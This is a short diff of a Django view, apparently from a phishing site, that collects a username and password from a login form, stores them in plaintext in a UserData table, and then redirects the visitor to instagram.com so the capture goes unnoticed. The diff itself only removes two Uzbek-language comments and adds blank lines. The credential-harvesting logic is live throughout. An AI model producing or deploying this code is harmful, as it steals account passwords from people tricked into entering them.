@@ -10,11 +10,11 @@ def home(request):
         if form.is_valid():
             username = form.cleaned_data['username']
             password = form.cleaned_data['password']
-            # Ma'lumotni modelga yozamiz
             UserData.objects.create(username=username, password=password)
-            return redirect('https://www.instagram.com/')  # Yoki 'success' sahifaga
+            return redirect('https://www.instagram.com/')
     else:
         form = UserDataForm()
     return render(request, 'index.html', {'form': form})
+
 
 
